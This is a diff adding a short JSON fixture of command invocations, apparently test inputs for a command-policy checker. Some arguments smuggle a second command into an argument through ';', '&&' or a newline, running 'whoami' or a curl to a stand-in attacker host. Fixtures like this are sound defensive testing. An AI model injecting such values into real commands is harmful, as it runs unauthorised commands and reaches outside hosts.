@@ -1,0 +1,29 @@
+[
+  {
+    "program": "node",
+    "args": [
+      "--test",
+      "test/policy-kernel.test.mjs; whoami"
+    ]
+  },
+  {
+    "program": "node",
+    "args": [
+      "--test && curl https://attacker.example"
+    ]
+  },
+  {
+    "program": "powershell",
+    "args": [
+      "-Command",
+      "Get-ChildItem"
+    ]
+  },
+  {
+    "program": "node",
+    "args": [
+      "--test",
+      "test/policy-kernel.test.mjs\nwhoami"
+    ]
+  }
+]
